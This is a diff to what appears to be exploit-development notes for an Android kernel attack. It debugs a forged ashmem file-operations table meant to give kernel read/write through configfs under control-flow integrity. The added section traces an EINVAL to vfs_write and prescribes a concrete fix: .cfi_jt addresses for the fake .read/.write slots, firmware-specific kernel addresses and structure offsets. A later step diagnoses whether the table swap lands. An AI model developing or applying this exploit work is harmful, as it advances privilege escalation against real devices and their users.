@@ -147,3 +147,73 @@ high confidence**. If any one frame is mis-read by a single 8-byte slot, the nex
 this order, fewest reboots): **−2**, then −1, −3, then 0/−4. Constraint: keep shift ≥ −2 so global
 word 0 (tree_pc) stays ≥ 0; a more-negative shift underflows the buffer (words <0 dropped → broken
 overlay, exactly the earlier `cannot place tree_pc` symptom).
+
+## configfs R/W method (EINVAL on the fops-swap write)
+
+Device: after shift=−2 the walk survives and the pselect route reaches try_cfi_stage; the first
+`configfs_write_once` (pwrite at pos 0 on the swapped-fops ashmem fd) returns **EINVAL(22)**.
+
+### The EINVAL is vfs_write's FMODE_CAN_WRITE gate, NOT configfs
+`configfs_write_bin_file` real entry = **0x6b5208** (via `.cfi_jt` 0x182f330: `bti c; b 0x6b5208`).
+Args `(file=x0, buf=x1, count=x2, ppos=x3)`, `buffer = file->private_data` (`ldr x24,[x0,#216]`
+@0x6b5228). Return codes: read_in_progress(buffer+0x54)!=0 → −26 ETXTBSY (0x6b5250);
+len>bin_buffer_size && cb_max_size && len>cb_max_size → −27 EFBIG (0x6b52ac); **`*ppos<0` → −22 EINVAL
+(0x6b52b8 `tbnz x25,#63`→0x6b53ac)**; copy_from_user fail → −14 EFAULT. The exploit pwrites at pos 0,
+so `configfs_write_bin_file` would NEVER return EINVAL if it were called. Therefore the EINVAL comes
+from `vfs_write`: `if (!(f_mode & FMODE_CAN_WRITE)) return -EINVAL;`.
+
+`FMODE_CAN_WRITE` is set at open iff `f_op->write || f_op->write_iter`. Real `ashmem_fops` (@0x229d120)
+is: owner=0, llseek=0x181f2e8, **read=0, write=0, read_iter=0x1821cc8, write_iter=0** (raw dump). So an
+fd opened on the REAL ashmem gets FMODE_CAN_READ but **NOT FMODE_CAN_WRITE** ⇒ pwrite → EINVAL. **The
+write fd is seeing real ashmem_fops, i.e. the fops swap is not in effect on it.**
+
+### configfs_buffer offsets — CORRECT (no change)
+Both `configfs_write_bin_file` and `configfs_read_bin_file`(0x6b4f90) use `file->private_data` at
+file+0xd8 and these fields, all matching the exploit's CFG_*:
+`read_in_progress` 0x54, `write_in_progress` 0x55, **`needs_read_fill` 0x50** (CFG_NEEDS_READ_FILL 80),
+**`bin_buffer` 0x58** (CFG_BIN_BUFFER 88), **`bin_buffer_size` 0x60**(int) (96), **`cb_max_size` 0x64**
+(100). CFG_PAGE_OFF 16 is unused on the bin path (needs_read_fill=0 → simple copy from bin_buffer).
+
+### fake_fops method bug (the real bug) + fix
+`put_fake_fops_table` (util.c) and `refresh_fake_fops_text` (fops.c) currently set the WRONG slots:
+`read_iter(0x20)=CONFIGFS_READ_ITER(0x6b4794)`, `write_iter(0x28)=CONFIGFS_BIN_WRITE_ITER(0x2157220)`,
+`read(0x10)=write(0x18)=0`. aristotle configfs bin files dispatch via **.read/.write**
+(`configfs_read_bin_file`/`configfs_write_bin_file`), and 0x2157220 is the `configfs_bin_file_operations`
+DATA TABLE, not a function — if the swap ever landed, `write_iter=table` would be called and executed as
+code → Oops. The genuine tables (ashmem_fops, configfs_bin_file_operations) store **`.cfi_jt`** addresses
+(ashmem llseek=0x181f2e8, ioctl=0x18368e0; configfs_bin_file_operations.read=0x182ee20,
+.write=0x182f330); kernel CFI checks indirect fop calls, so fake_fops MUST use the `.cfi_jt` form.
+
+Concrete fix (address form = `.cfi_jt`):
+- target.h: `#define CONFIGFS_READ_BIN_JT_OFF  0x0182ee20`  (`configfs_read_bin_file.cfi_jt`)
+             `#define CONFIGFS_WRITE_BIN_JT_OFF 0x0182f330`  (`configfs_write_bin_file.cfi_jt`)
+  and `#define CONFIGFS_READ_BIN_JT (KIMAGE_TEXT_BASE+CONFIGFS_READ_BIN_JT_OFF)` (same for WRITE).
+  (CONFIGFS_READ_ITER_OFF/CONFIGFS_BIN_WRITE_ITER_OFF are wrong — retire or ignore them.)
+- util.c `put_fake_fops_table` AND fops.c `refresh_fake_fops_text` — set:
+    FOPS_READ_OFF(0x10)       = text_addr(CONFIGFS_READ_BIN_JT)    (was 0)
+    FOPS_WRITE_OFF(0x18)      = text_addr(CONFIGFS_WRITE_BIN_JT)   (was 0)
+    FOPS_READ_ITER_OFF(0x20)  = 0                                  (was CONFIGFS_READ_ITER)
+    FOPS_WRITE_ITER_OFF(0x28) = 0                                  (was CONFIGFS_BIN_WRITE_ITER)
+  This also fixes FMODE_CAN_WRITE at open (write≠0) and FMODE_CAN_READ (read≠0).
+  configfs_write_once/read_once (pwrite/pread at pos 0) work unchanged: `.write(file,buf,count,ppos)`
+  and `.read` are the exact vfs signatures; no wrapper change.
+
+### Swap-landing (Q4) — the method fix is also the diagnostic
+With the CURRENT build, IF the swap had landed, the post-swap open would set FMODE_CAN_WRITE (write_iter
+non-NULL) and pwrite would call the data table → panic, not EINVAL. Since we get EINVAL, the swap is
+**not in effect on the write fd** even though the dequeue rb_erase (0x1e7d84, Case-2) statically should
+write `*ASHMEM_MISC_FOPS_alias = fake_fops`. The fd timing is fine (`try_cfi_stage` opens fresh AFTER
+pselect returns). So either the walk exits before [7] with the real device's live values, or the rb
+write doesn't stick (target not writable via the linear alias / MTE tag mismatch / wrong value).
+
+Apply the method fix first — it is required regardless AND disambiguates:
+- EINVAL → success/EFBIG: the swap WAS landing; the method slot was the only bug. Done.
+- EINVAL persists: the swap is genuinely not landing → next, prove the write executes. Cheapest
+  diagnostic: right after the pselect route, `pr_success`-log a fresh `open("/dev/ashmem",O_RDWR)` then
+  attempt a 1-byte `pwrite` and log errno — EINVAL still ⇒ real fops (no swap); a non-EINVAL/crash ⇒
+  fake fops present. (A kernel read-back of *ASHMEM_MISC_FOPS needs the physrw we don't have yet.)
+
+### RVA index (configfs)
+configfs_read_bin_file 0x6b4f90 (.cfi_jt 0x182ee20); configfs_write_bin_file 0x6b5208 (.cfi_jt
+0x182f330); configfs_bin_file_operations table 0x2157220; ashmem_fops 0x229d120; ashmem_misc 0x28c6670
+(.fops @ +0x10 = 0x28c6680). EINVAL @ configfs_write_bin_file 0x6b53ac (ppos<0 only).
